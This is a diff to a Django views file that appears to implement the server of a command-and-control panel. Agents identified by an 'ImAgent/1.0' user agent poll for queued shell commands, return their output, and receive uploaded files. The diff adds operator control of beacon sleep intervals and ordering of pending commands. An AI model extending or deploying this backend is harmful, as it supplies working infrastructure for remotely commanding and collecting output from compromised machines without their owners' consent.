@@ -1,5 +1,5 @@
 from math import ceil
-from django.http import HttpResponse
+from django.http import HttpResponse, Http404
 from django.contrib.auth import logout
 from django.views.decorators.csrf import csrf_exempt
 from django.utils.decorators import method_decorator
@@ -13,6 +13,7 @@ import re
 from .forms import UploadsForm
 import json
 import subprocess
+import chardet
 
 
 def name_extractor(request):
@@ -34,6 +35,7 @@ def get_client_ip(request):
 
 
 def create_or_get_users(request, id_name):
+    id_name = id_name.lower()
     agent = Clients.objects.filter(id_name=id_name).first()
     if agent:
         if f'{agent.id_name} ImAgent/1.0' in request.META.get('HTTP_USER_AGENT'):
@@ -87,6 +89,7 @@ class IndexView(View):
                 'ip_address': client.ip_address,
                 'last_online_str': client.last_online_str(),
                 'last_online': client.last_online(),
+                'interval': client.interval,
             }
         json_data = json.dumps(client_list)
         commands_json = json.dumps(commands_list)
@@ -110,7 +113,6 @@ class IndexView(View):
             Commands.objects.create(receiver=receiver,
                                     command=self.request.POST.get('command'), timestamp=now())
         if request.FILES:
-            print(request.FILES)
             form = UploadsForm(request.POST, request.FILES)
             client_name = self.request.POST.get('upload_btn')
             client_name = client_name.split(' ')[2]
@@ -127,6 +129,17 @@ class IndexView(View):
             else:
                 print(f'file error: {form.errors}')
 
+        if self.request.POST.get('interval_input'):
+            client_name = self.request.POST.get('interval_btn')
+            client_name = client_name.split(' ')[2]
+            interval = self.request.POST.get('interval_input')
+            agent = create_or_get_users(request, client_name)
+
+            if agent:
+                Commands.objects.create(receiver=agent,command=f"sleep {interval}", timestamp=now())
+            else:
+                return Http404("agent not found")
+
         return redirect('index')
 
 
@@ -137,17 +150,18 @@ class SendCommand(View):
         agent = create_or_get_users(request, name)
 
         if not agent:
-            return HttpResponse('Agent not found', status=400)
+            return HttpResponse('Agent not found', status=404)
 
-        cmd_execution = Commands.objects.filter(receiver=agent, is_executed=False).first()
+        cmd_execution = Commands.objects.filter(receiver=agent, is_executed=False, command__icontains='dir').order_by('timestamp').first()
 
         if cmd_execution:
-
-            if not cmd_execution.is_executed:
+            cmd = f'{cmd_execution.command}, id={cmd_execution.id}'
+            return HttpResponse(cmd, status=200)
+        else:
+            cmd_execution = Commands.objects.filter(receiver=agent, is_executed=False).order_by('timestamp').first()
+            if cmd_execution:
                 cmd = f'{cmd_execution.command}, id={cmd_execution.id}'
-                return HttpResponse(cmd)
-            else:
-                return HttpResponse("Command already executed.", status=200)
+                return HttpResponse(cmd, status=200)
 
         return HttpResponse("No command available.", status=200)
 
@@ -155,11 +169,11 @@ class SendCommand(View):
         name = name_extractor(request)
         agent = create_or_get_users(request, name)
         body = request.body.decode('utf-8')
-
+        print(body)
         if not agent:
-            return HttpResponse("No client found for this IP.", status=401)
+            return HttpResponse("No client found.", status=404)
 
-        match = re.search(r'id\s*=\s*(\d+)', body)
+        match = re.search(r'\n,id\s*=\s*(\d+)', body)
         if not match:
             return HttpResponse("Mistake detected. No ID sent :|", status=400)
 
@@ -169,12 +183,12 @@ class SendCommand(View):
 
         if cmd:
             cmd.is_executed = True
-            response = re.sub(r'id\s*=\s*(\d+)', '', body).strip()
+            response = re.sub(r'\n,id\s*=\s*(\d+)', '', body).strip()
             cmd.response = response
             cmd.save()
             return HttpResponse("Command executed successfully.", status=200)
 
-        return HttpResponse("Command not found.", status=404)
+        return HttpResponse("Command not found.", status=401)
 
 
 @method_decorator(csrf_exempt, name='dispatch')
@@ -256,3 +270,5 @@ class FileUploadView(View):
 def logout_view(request):
     logout(request)
     return redirect('login')
+
+
